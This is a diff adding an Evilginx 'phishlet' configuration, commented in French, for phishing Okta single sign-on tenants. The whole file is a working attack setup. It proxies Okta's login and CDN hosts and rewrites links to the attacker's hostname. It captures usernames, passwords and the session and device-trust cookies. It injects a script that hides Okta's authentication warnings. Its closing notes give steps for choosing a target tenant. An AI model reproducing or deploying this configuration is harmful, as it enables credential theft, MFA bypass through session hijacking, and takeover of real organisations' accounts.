@@ -1,0 +1,193 @@
+##########################################################
+# PHISHLET OKTA - EVILGINX PRO
+# Configuration pour Okta SSO
+##########################################################
+
+name: "okta"
+author: "@breakdev"
+min_ver: "3.0.0"
+
+##########################################################
+# PROXY HOSTS
+##########################################################
+proxy_hosts:
+  # Okta tenant (adapter selon le tenant cible)
+  # Format: {company}.okta.com ou {company}.oktapreview.com
+  - phish_sub: "{tenant}"
+    orig_sub: "{tenant}"
+    domain: "okta.com"
+    session: true
+    is_landing: true
+    auto_filter: true
+
+  # Okta CDN
+  - phish_sub: "ok1static"
+    orig_sub: "ok1static"
+    domain: "oktacdn.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "ok2static"
+    orig_sub: "ok2static"
+    domain: "oktacdn.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "ok3static"
+    orig_sub: "ok3static"
+    domain: "oktacdn.com"
+    session: false
+    is_landing: false
+
+##########################################################
+# SUB FILTERS
+##########################################################
+sub_filters:
+  # Okta tenant principal
+  - triggers_on: "{tenant}.okta.com"
+    orig_sub: "{tenant}"
+    domain: "okta.com"
+    search: "{tenant}.okta.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  - triggers_on: "{tenant}.okta.com"
+    orig_sub: "{tenant}"
+    domain: "okta.com"
+    search: "https://{tenant}.okta.com"
+    replace: "https://{hostname}"
+    mimes: ["text/html", "application/json"]
+
+  # CDN Resources
+  - triggers_on: "{tenant}.okta.com"
+    orig_sub: "ok1static"
+    domain: "oktacdn.com"
+    search: "ok1static.oktacdn.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+  - triggers_on: "{tenant}.okta.com"
+    orig_sub: "ok2static"
+    domain: "oktacdn.com"
+    search: "ok2static.oktacdn.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css"]
+
+  - triggers_on: "{tenant}.okta.com"
+    orig_sub: "ok3static"
+    domain: "oktacdn.com"
+    search: "ok3static.oktacdn.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "application/javascript"]
+
+##########################################################
+# AUTH TOKENS
+##########################################################
+auth_tokens:
+  # Cookies de session Okta
+  - domain: ".okta.com"
+    keys:
+      - "sid" # Session ID
+      - "idx" # Identity token
+      - "dt" # Device token
+      - "JSESSIONID" # Java session
+      - "DT" # Device Trust token
+
+  - domain: ".{tenant}.okta.com"
+    keys:
+      - "sid"
+      - "idx"
+      - "dt"
+
+##########################################################
+# CREDENTIALS
+##########################################################
+credentials:
+  # Username
+  username:
+    key: "username"
+    search: "(.*)"
+    type: "post"
+
+  # Password
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+##########################################################
+# LOGIN
+##########################################################
+login:
+  domain: "{tenant}.okta.com"
+  path: "/login/login.htm"
+
+##########################################################
+# FORCE POST
+##########################################################
+force_post:
+  - path: "/api/v1/authn"
+    search:
+      - { key: "username", search: "(.*)" }
+      - { key: "password", search: "(.*)" }
+    force:
+      - { key: "username", value: "{username}" }
+      - { key: "password", value: "{password}" }
+    type: "post"
+
+##########################################################
+# JS INJECT (Pro)
+##########################################################
+js_inject:
+  - trigger_domains: ["{tenant}.okta.com"]
+    trigger_paths: ["/login/login.htm", "/signin"]
+    script: |
+      // Contournement détection Okta
+      console.log('Okta phishing active');
+
+      // Masquer les messages d'authentification supplémentaire
+      var mfaWarnings = document.querySelectorAll('.o-form-error-container');
+      mfaWarnings.forEach(function(el) { el.style.display = 'none'; });
+
+##########################################################
+# AUTH URLS
+##########################################################
+auth_urls:
+  - "/login/login.htm"
+  - "/api/v1/authn"
+  - "/api/v1/sessions"
+  - "/signin"
+  - "/oauth2/v1/authorize"
+
+##########################################################
+# LANDING URLS
+##########################################################
+landing_urls:
+  - "/app/UserHome"
+  - "/enduser/dashboard"
+  - "https://{tenant}.okta.com/app/UserHome"
+##########################################################
+# NOTES
+##########################################################
+# CONFIGURATION IMPORTANTE :
+# Remplacer {tenant} par le nom du tenant Okta cible
+# Exemples : company.okta.com, acme.oktapreview.com
+#
+# Pour utiliser ce phishlet :
+# 1. Identifier le tenant cible (ex: "acme")
+# 2. Remplacer {tenant} dans le fichier par "acme"
+# 3. Ou utiliser la variable dynamique si supportée
+#
+# Okta utilise :
+# - MFA (Okta Verify, SMS, TOTP, etc.)
+# - Device Trust
+# - Adaptive MFA (contextual authentication)
+#
+# Ce phishlet capture :
+# - Username et password
+# - Session ID (sid)
+# - Device tokens (dt, DT)
+#
+# ⚠️ NOTE : Okta détecte les tentatives de phishing
+# Les tenants avec ThreatInsight activé peuvent bloquer
+##########################################################
